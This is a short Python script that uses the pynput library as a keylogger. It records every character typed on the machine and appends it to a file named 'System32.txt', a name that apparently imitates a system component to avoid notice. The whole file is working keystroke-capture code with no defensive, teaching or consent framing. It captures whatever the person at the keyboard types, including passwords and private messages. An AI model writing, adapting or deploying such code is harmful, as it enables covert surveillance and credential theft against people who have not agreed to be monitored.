import os
from pynput.keyboard import Key, Listener

file_path = "C:\\Users\\kiril\\System32.txt"

char_count = 0


def on_key_press(key):
    global char_count
    try:
        char = key.char

        if char:
            with open(file_path, "a", encoding="utf-8") as text_file:
                text_file.write(char)
                char_count += 1

                if char_count >= 80:
                    text_file.write("\n")
                    char_count = 0

    except AttributeError:
        if key in [Key.space, Key.enter, Key.tab]:
            with open(file_path, "a") as text_file:
                text_file.write(" '' ")


# Ensure the directory structure exists
os.makedirs(os.path.dirname(file_path), exist_ok=True)

# Set up a keyboard listener
with Listener(on_press=on_key_press) as listener:
    listener.join()

# pip install pynput
